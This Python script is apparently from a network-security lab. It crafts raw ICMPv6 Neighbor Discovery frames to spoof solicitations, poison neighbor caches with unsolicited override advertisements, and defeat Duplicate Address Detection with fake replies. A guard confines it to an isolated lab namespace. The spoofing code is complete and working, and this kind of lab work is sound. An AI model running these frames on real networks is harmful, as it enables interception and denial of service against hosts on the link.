#!/usr/bin/env python3
"""Bounded IPv6 ND experiments. Run ONLY inside isolated l05atk namespace."""
import argparse
import ipaddress
import os
import socket
import struct
import subprocess
import time

MAC = bytes.fromhex('0205050001aa')
MAC_STR = '02:05:05:00:01:aa'
DAD_TARGET = '2000::55aa'

def ip6(s):
    return ipaddress.IPv6Address(s).packed

def ck(data):
    if len(data) % 2:
        data += b'\x00'
    total = sum(struct.unpack('!' + 'H' * (len(data) // 2), data))
    while total >> 16:
        total = (total & 0xffff) + (total >> 16)
    return (~total) & 0xffff

def make_frame(l2dst, ipv6src, ipv6dst, icmp_type, target, option, flags=0):
    target_bytes = ip6(target)
    if icmp_type == 135:
        body = b'\0' * 4 + target_bytes
    elif icmp_type == 136:
        body = struct.pack('!I', flags) + target_bytes
    else:
        raise ValueError('unsupported ICMPv6 type')
    if option:
        body += (b'\x01\x01' if icmp_type == 135 else b'\x02\x01') + MAC
    msg = struct.pack('!BBH', icmp_type, 0, 0) + body
    src, dst = ip6(ipv6src), ip6(ipv6dst)
    pseudo = src + dst + struct.pack('!I3xB', len(msg), 58)
    msg = msg[:2] + struct.pack('!H', ck(pseudo + msg)) + msg[4:]
    hdr = struct.pack('!IHBB16s16s', 6 << 28, len(msg), 58, 255, src, dst)
    return l2dst + MAC + b'\x86\xdd' + hdr + msg

def guard():
    if os.geteuid() != 0:
        raise SystemExit('Root required')
    mac = open('/sys/class/net/eth0/address', encoding='ascii').read().strip().lower()
    addresses = subprocess.check_output(['ip','-6','-o','addr','show','dev','eth0'], text=True)
    if mac != MAC_STR or '2000::a/64' not in addresses:
        raise SystemExit('STOP: not the isolated l05atk eth0; refusing to send')

def main():
    p = argparse.ArgumentParser()
    p.add_argument('mode', choices=['ns','na','dad'])
    args = p.parse_args()
    guard()
    sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x86dd))
    sock.bind(('eth0', 0))
    all_nodes = bytes.fromhex('333300000001')
    if args.mode == 'ns':
        frame = make_frame(bytes.fromhex('3333ff000002'), '2000::1',
                           'ff02::1:ff00:2', 135, '2000::2', True)
        for _ in range(5):
            sock.send(frame)
            time.sleep(.15)
        print('NS_SENT=5 CLAIM_SOURCE=2000::1 CLAIM_LLADDR=' + MAC_STR, flush=True)
    elif args.mode == 'na':
        frame = make_frame(all_nodes, '2000::2', 'ff02::1',
                           136, '2000::2', True, 0x20000000)
        for _ in range(5):
            sock.send(frame)
            time.sleep(.15)
        print('NA_SENT=5 CLAIM_TARGET=2000::2 CLAIM_LLADDR=' + MAC_STR, flush=True)
    else:
        print('DAD_SENDER_READY target=' + DAD_TARGET, flush=True)
        time.sleep(.35)
        frame = make_frame(all_nodes, DAD_TARGET, 'ff02::1',
                           136, DAD_TARGET, True, 0x20000000)
        for _ in range(6):
            sock.send(frame)
            time.sleep(.12)
        print('DAD_FAKE_NA_SENT=6 target=' + DAD_TARGET, flush=True)
        sock.close()
        return
    sock.close()

if __name__ == '__main__':
    main()
